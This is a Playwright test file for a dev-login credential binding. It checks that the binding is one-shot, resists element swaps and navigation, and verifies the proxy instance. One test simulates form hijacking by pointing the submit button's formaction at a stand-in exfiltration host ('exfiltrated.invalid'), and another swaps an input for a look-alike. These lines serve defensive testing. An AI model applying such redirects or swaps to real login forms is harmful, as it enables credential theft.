// M8 task 9.2 (NW-AUD-021 residual) — the DEV credential binding acts on the
// VERIFIED element identity, marks itself used on the first effect, and binds
// the source-approved exchange and proxy instance. R2-07, R2-31, R2-32, R2-34,
// R2-36.
import { test, expect } from '@playwright/test';
import fs from 'node:fs';
import path from 'node:path';
import {
  createSourceApprovedDevLoginBinding,
  fillAndSubmitSourceApprovedDevLogin,
  sourceApprovedDevLoginControls,
} from '../../src/auth/loginForm';
import { startFixtureServer } from '../../src/browser/fixtures/fixtureServer';

const REPO_ROOT = path.resolve(__dirname, '..', '..');
const LOGIN_FORM = path.join(REPO_ROOT, 'src', 'auth', 'loginForm.ts');
const SYNTHETIC_PASSWORD = 'SYNTHETIC_LOGIN_SENTINEL_9f2c41ab7d5e';

test.describe('DEV credential effect binding (9.2)', () => {
  test('the binding refuses a second effect sequence and reports itself used', async ({ page }) => {
    const server = await startFixtureServer('auth');
    try {
      await page.goto(`${server.origin}/`, { waitUntil: 'domcontentloaded' });
      const binding = await createSourceApprovedDevLoginBinding(page, sourceApprovedDevLoginControls(page));
      expect(binding.used).toBe(false);
      await binding.beginEffectSequence();
      expect(binding.used).toBe(true);
      // A second sequence is the second USE of a one-shot binding.
      await expect(binding.beginEffectSequence()).rejects.toThrow(/AUTH_FORM_BINDING_STALE/);
    } finally {
      await server.close();
    }
  });

  test('an element swapped between the check and the effect detaches the pinned handle', async ({ page }) => {
    const server = await startFixtureServer('auth');
    try {
      await page.goto(`${server.origin}/`, { waitUntil: 'domcontentloaded' });
      const binding = await createSourceApprovedDevLoginBinding(page, sourceApprovedDevLoginControls(page));
      const pins = await binding.beginEffectSequence();
      // Swap the marked control for a look-alike AFTER verification: the pin
      // still points at the verified element, so the effect cannot be
      // redirected onto the replacement.
      await page.locator('input[name="username"]').evaluate((element) => {
        const replacement = element.cloneNode(true);
        element.replaceWith(replacement);
      });
      await expect(pins.username.fill('synthetic-dev-user')).rejects.toThrow();
      await binding.revoke();
      expect(page.url()).not.toContain('synthetic-authenticated');
    } finally {
      await server.close();
    }
  });

  test('a navigation between effects invalidates the binding', async ({ page }) => {
    const server = await startFixtureServer('auth');
    try {
      await page.goto(`${server.origin}/`, { waitUntil: 'domcontentloaded' });
      const binding = await createSourceApprovedDevLoginBinding(page, sourceApprovedDevLoginControls(page));
      await binding.beginEffectSequence();
      await page.goto(`${server.origin}/synthetic-authenticated`, { waitUntil: 'domcontentloaded' });
      await expect(binding.assertCurrent()).rejects.toThrow(/AUTH_FORM_BINDING_STALE/);
    } finally {
      await server.close();
    }
  });

  test('a control whose own formAction disagrees with its form is refused before any effect', async ({ page }) => {
    const server = await startFixtureServer('auth');
    try {
      await page.goto(`${server.origin}/`, { waitUntil: 'domcontentloaded' });
      const binding = await createSourceApprovedDevLoginBinding(page, sourceApprovedDevLoginControls(page));
      // A listener that redirects the exchange after binding is exactly the
      // R2-34 case: the approved exchange no longer matches.
      await page.locator('form button[type="submit"]').evaluate((element) => {
        element.setAttribute('formaction', 'https://exfiltrated.invalid/synthetic');
      });
      await expect(binding.assertCurrent()).rejects.toThrow(/AUTH_FORM_BINDING_STALE/);
      expect(page.url()).not.toContain('synthetic-authenticated');
    } finally {
      await server.close();
    }
  });

  test('the proxy-instance binding refuses a page that does not echo the expected instance', async ({ page }) => {
    const server = await startFixtureServer('auth');
    try {
      await page.goto(`${server.origin}/`, { waitUntil: 'domcontentloaded' });
      await expect(createSourceApprovedDevLoginBinding(page, sourceApprovedDevLoginControls(page), {
        expectedProxyInstanceId: 'proxy-instance:synthetic-expected',
      })).rejects.toThrow(/AUTH_FORM_BINDING_STALE/);
      await page.evaluate(() => {
        (globalThis as unknown as { __nightwatchProxyInstance?: string }).__nightwatchProxyInstance = 'proxy-instance:synthetic-expected';
      });
      const binding = await createSourceApprovedDevLoginBinding(page, sourceApprovedDevLoginControls(page), {
        expectedProxyInstanceId: 'proxy-instance:synthetic-expected',
      });
      await binding.assertCurrent();
      await binding.revoke();
    } finally {
      await server.close();
    }
  });

  test('the full login still succeeds with the pinned-handle effects', async ({ page }) => {
    const server = await startFixtureServer('auth');
    try {
      await page.goto(`${server.origin}/`, { waitUntil: 'domcontentloaded' });
      const binding = await createSourceApprovedDevLoginBinding(page, sourceApprovedDevLoginControls(page));
      await fillAndSubmitSourceApprovedDevLogin(binding, { username: 'synthetic-dev-user', password: SYNTHETIC_PASSWORD });
      await expect(page).toHaveURL(`${server.origin}/synthetic-authenticated`);
    } finally {
      await server.close();
    }
  });

  test('the source census pins the effect sites, the one-shot mark and the no-credential-in-callback rule', () => {
    const source = fs.readFileSync(LOGIN_FORM, 'utf8');
    // Every secret-bearing effect goes through a PINNED handle, never a fresh
    // locator resolution (R2-07).
    expect(source).not.toMatch(/controls\.(username|password|submit)\.(fill|click)\(/);
    for (const effect of ['pins.username.fill(', 'pins.password.fill(', 'pins.submit.click(']) {
      expect(source, `${effect} must be the effect site`).toContain(effect);
    }
    // The one-shot mark is set on the first effect, not on verification.
    expect(source).toContain('if (used) stale();');
    expect(source).toContain('used = true;');
    expect(source).toContain('beginEffectSequence');
    // The credential never becomes a page-callback argument or a DOM marker.
    expect(source).not.toMatch(/evaluate\([^)]*credential/);
    expect(source).not.toMatch(/setAttribute\([^)]*credential/);
    // Every verification that precedes an effect is the same-evaluate form.
    const verifications = source.match(/const state = await page\.evaluate\(/g) ?? [];
    expect(verifications.length).toBe(1);
    // The approved exchange and proxy instance are bound.
    expect(source).toContain('submitAction');
    expect(source).toContain('submitMethod');
    expect(source).toContain('__nightwatchProxyInstance');
    // Credential consumer census (R2-31): the only readers of the credential
    // object are the two fill sites, and nothing else touches it.
    const consumers = source.match(/credential\.[A-Za-z]+/g) ?? [];
    expect([...new Set(consumers)].sort()).toEqual(['credential.password', 'credential.username']);
  });
});
